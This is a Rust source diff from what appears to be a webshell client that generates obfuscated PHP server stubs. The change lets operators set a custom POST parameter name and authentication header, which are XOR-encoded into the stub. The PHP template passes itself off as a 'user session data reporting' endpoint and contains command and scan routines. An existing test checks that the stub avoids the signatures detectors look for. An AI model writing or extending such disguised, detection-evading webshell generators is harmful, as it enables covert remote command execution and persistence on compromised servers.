@@ -392,6 +392,86 @@ pub trait PayloadEncoder: Send + Sync {
     fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         self.stub(language, password)
     }
+
+    /// 服务端：带生成选项的 stub（Transport Profile：参数名 / 鉴权头名）。
+    /// 默认转调 [`Self::stub`]；只有把这些名字烘焙进 stub 的编码器需要覆写。
+    fn stub_with(
+        &self,
+        language: &str,
+        password: &str,
+        _opts: &StubOptions,
+    ) -> Result<String, ProtocolError> {
+        self.stub(language, password)
+    }
+}
+
+/// stub 生成选项（Transport Profile 的服务端一半）。
+///
+/// NATIVE 通道把请求参数名与鉴权头名烘焙进 stub，二者必须与客户端
+/// `protocol_params.transport` 中配置的一致；默认值即历史行为。
+#[derive(Debug, Clone)]
+pub struct StubOptions {
+    /// 请求参数名（`$_POST[...]`），默认 `formData`。
+    pub param: String,
+    /// 鉴权 HTTP 头名，默认 `X-Debug-Key`。
+    pub header: String,
+}
+
+impl Default for StubOptions {
+    fn default() -> Self {
+        Self {
+            param: "formData".to_string(),
+            header: "X-Debug-Key".to_string(),
+        }
+    }
+}
+
+impl StubOptions {
+    /// 校验参数名与头名（命令层保存配置时也调用它，尽早报错）。
+    ///
+    /// - 参数名必须是合法 PHP 标识符形态：`[A-Za-z_][A-Za-z0-9_]*`，≤ 64 字节
+    /// - 头名必须是 HTTP token：`[A-Za-z0-9-]+`，≤ 64 字节（防 CRLF/头注入）
+    pub fn validate(&self) -> Result<(), ProtocolError> {
+        validate_php_ident("请求参数名", &self.param)?;
+        validate_http_header(&self.header)
+    }
+}
+
+/// 校验 PHP 标识符形态的字符串（`[A-Za-z_][A-Za-z0-9_]*`，≤ 64 字节）。
+pub fn validate_php_ident(label: &str, value: &str) -> Result<(), ProtocolError> {
+    let mut bytes = value.bytes();
+    let ok = value.len() <= 64
+        && bytes
+            .next()
+            .is_some_and(|b| b.is_ascii_alphabetic() || b == b'_')
+        && bytes.all(|b| b.is_ascii_alphanumeric() || b == b'_');
+    if ok {
+        return Ok(());
+    }
+    Err(ProtocolError::NotSupported(format!(
+        "{label}不合法：{value}（只允许字母/数字/下划线，且不能以数字开头，长度 1-64）"
+    )))
+}
+
+/// 校验 HTTP 头名（RFC 7230 token：字母/数字/`-`，长度 1-64）。
+///
+/// 严格拒绝 `\r`/`\n`/空白/冒号 —— 传输形态来自持久化的 Shell 档案，
+/// 不能成为请求头注入的入口。
+pub fn validate_http_header(name: &str) -> Result<(), ProtocolError> {
+    let ok = !name.is_empty()
+        && name.len() <= 64
+        && name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-');
+    if ok {
+        return Ok(());
+    }
+    Err(ProtocolError::NotSupported(format!(
+        "HTTP 头名不合法：{name}（只允许字母/数字/-，长度 1-64）"
+    )))
+}
+
+/// HTTP 头名 → PHP `$_SERVER` 键（`X-Debug-Key` → `HTTP_X_DEBUG_KEY`）。
+pub fn http_server_key(header: &str) -> String {
+    format!("HTTP_{}", header.to_ascii_uppercase().replace('-', "_"))
 }
 
 /// 编码器注册表。
@@ -408,6 +488,11 @@ pub struct AeadEncoder;
 /// 依赖：PHP 7.1+（`hash_hkdf`）、openssl 扩展（`openssl_encrypt('aes-256-gcm')`）、
 /// 64 位 PHP（响应序号用 `pack('J')`）。
 pub fn aead_php_stub(password: &str) -> String {
+    aead_php_stub_with(password, &StubOptions::default())
+}
+
+/// 带生成选项的 AEAD stub（参数名 / 鉴权头名可配）。
+pub fn aead_php_stub_with(password: &str, opts: &StubOptions) -> String {
     let prefix = format!("_{}_", php_ident());
     let xk = alpha_ident();
     let key = crate::aead::derive_key(password);
@@ -479,8 +564,9 @@ pub fn aead_php_stub(password: &str) -> String {
         .replace("__DEC__", &format!("{prefix}dec"))
         .replace("__XOR__", &format!("{prefix}xor"))
         .replace("__XK__", &xk)
-        .replace("__GKHEX__", &xor_hex("HTTP_X_DEBUG_KEY", &xk))
+        .replace("__GKHEX__", &xor_hex(&http_server_key(&opts.header), &xk))
         .replace("__TOKENHEX__", &xor_hex(&token, &xk))
+        .replace("__PARAM__", &opts.param)
         .replace("__KEYHEX__", &xor_hex(&ikm_hex, &xk))
         .replace("__CMD__", &format!("{prefix}cmd"))
         .replace("__SCAN__", &format!("{prefix}scan"))
@@ -544,8 +630,17 @@ impl PayloadEncoder for AeadEncoder {
     }
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        self.stub_with(language, password, &StubOptions::default())
+    }
+
+    fn stub_with(
+        &self,
+        language: &str,
+        password: &str,
+        opts: &StubOptions,
+    ) -> Result<String, ProtocolError> {
         match language {
-            "php" => Ok(aead_php_stub(password)),
+            "php" => Ok(aead_php_stub_with(password, opts)),
             other => Err(ProtocolError::NotSupported(format!(
                 "AEAD 暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -1808,7 +1903,7 @@ impl PayloadEncoder for XorSessionEncoder {
 const NATIVE_STUB_TPL: &str = r#"<?php
 /*
  * 用户会话数据上报接口
- * 业务：接收客户端上报的压缩会话数据（formData），解包后按规则类型处理并返回状态
+ * 业务：接收客户端上报的压缩会话数据，解包后按规则类型处理并返回状态
  */
 @set_time_limit(0);
 @ini_set('display_errors','0');
@@ -1961,8 +2056,8 @@ try{
 }catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}
 }
 /* 入口：接收上报数据 */
-if(isset($_POST['formData'])){
-    $b=is_string($_POST['formData'])?$_POST['formData']:'';
+if(isset($_POST['__PARAM__'])){
+    $b=is_string($_POST['__PARAM__'])?$_POST['__PARAM__']:'';
     $in=@$_g[1]($b);
     /* 传输压缩（gzip）：兼容旧客户端在**密文层**压缩的载荷（gzip 魔数则解压；
        目标无 zlib 时原样）。同时回写 $b（AES 等变体按 $b 解密，需保持 base64 形式） */
@@ -2128,6 +2223,15 @@ impl PayloadEncoder for NativeEncoder {
     }
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        self.stub_with(language, password, &StubOptions::default())
+    }
+
+    fn stub_with(
+        &self,
+        language: &str,
+        password: &str,
+        opts: &StubOptions,
+    ) -> Result<String, ProtocolError> {
         match language {
             "php" => {
                 let prefix = format!("_{}_", php_ident());
@@ -2146,8 +2250,9 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__DEC__", &format!("{prefix}dec"))
                     .replace("__XOR__", &format!("{prefix}xor"))
                     .replace("__XK__", &xk)
-                    .replace("__GKHEX__", &xor_hex("HTTP_X_DEBUG_KEY", &xk))
+                    .replace("__GKHEX__", &xor_hex(&http_server_key(&opts.header), &xk))
                     .replace("__TOKENHEX__", &xor_hex(token, &xk))
+                    .replace("__PARAM__", &opts.param)
                     .replace("__KEYHEX__", &xor_hex(&key_hex, &xk))
                     .replace("__CMD__", &format!("{prefix}cmd"))
                     .replace("__SCAN__", &format!("{prefix}scan"))
@@ -2570,6 +2675,68 @@ mod tests {
         )
         .unwrap();
         assert_eq!(String::from_utf8(restored).unwrap(), code);
+    }
+
+    /// Transport Profile：参数名 / 鉴权头名可配，默认值与历史行为一致。
+    #[test]
+    fn stub_with_custom_param_and_header() {
+        let opts = StubOptions {
+            param: "sess".into(),
+            header: "X-Token".into(),
+        };
+        let stub = NativeEncoder { crypto: "xor" }
+            .stub_with("php", "secret", &opts)
+            .expect("生成 stub");
+        assert!(stub.contains("$_POST['sess']"), "stub 应使用自定义参数名");
+        assert!(!stub.contains("formData"), "stub 不应残留默认参数名");
+        assert!(!stub.contains("X-Token"), "头名应以 XOR 十六进制嵌入");
+        // 默认调用仍产出历史形态
+        let default_stub = NativeEncoder { crypto: "xor" }
+            .stub("php", "secret")
+            .expect("生成默认 stub");
+        assert!(default_stub.contains("$_POST['formData']"));
+        assert!(!default_stub.contains("$_POST['sess']"));
+
+        // AEAD stub 共用同一模板，也必须支持
+        let aead = AeadEncoder
+            .stub_with("php", "secret", &opts)
+            .expect("生成 AEAD stub");
+        assert!(aead.contains("$_POST['sess']"));
+        assert!(!aead.contains("$_POST['formData']"));
+    }
+
+    /// Transport Profile 校验：参数名必须是 PHP 标识符；头名必须是 HTTP token
+    /// （拒绝 CRLF/头注入）。
+    #[test]
+    fn stub_options_validate_rejects_bad_values() {
+        let ok = StubOptions {
+            param: "ok_1".into(),
+            header: "X-Ok".into(),
+        };
+        assert!(ok.validate().is_ok());
+        for param in ["", "1abc", "bad-name", "a b", "x".repeat(65).as_str()] {
+            let opts = StubOptions {
+                param: param.to_string(),
+                ..StubOptions::default()
+            };
+            assert!(opts.validate().is_err(), "参数名应被拒绝：{param:?}");
+        }
+        for header in [
+            "",
+            "bad header",
+            "X\r\nInjected: 1",
+            "X_I",
+            "x".repeat(65).as_str(),
+        ] {
+            let opts = StubOptions {
+                header: header.to_string(),
+                ..StubOptions::default()
+            };
+            assert!(opts.validate().is_err(), "头名应被拒绝：{header:?}");
+        }
+        // 头名 → $_SERVER 键
+        assert_eq!(http_server_key("X-Debug-Key"), "HTTP_X_DEBUG_KEY");
+        assert_eq!(http_server_key("X-Token"), "HTTP_X_TOKEN");
     }
 
     /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
